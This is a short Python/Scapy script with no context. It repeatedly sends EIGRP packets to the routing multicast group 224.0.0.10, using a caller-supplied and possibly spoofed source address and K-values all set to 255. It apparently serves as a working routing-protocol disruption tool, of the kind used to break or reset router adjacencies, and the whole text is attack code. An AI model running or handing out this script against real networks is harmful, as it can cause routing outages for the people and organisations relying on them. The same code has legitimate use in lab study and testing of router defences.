

from scapy.all import *
import time
load_contrib('eigrp')

def eigrp(address):
   for i in range(0,50):
       sendp(Ether()/IP(src=address,dst="224.0.0.10")/EIGRP(asn=100,
    							 tlvlist=[EIGRPParam(k1=255,k2=255,k3=255,k4=255,k5=255),EIGRPSwVer()]))
       time.sleep(1)
      
       
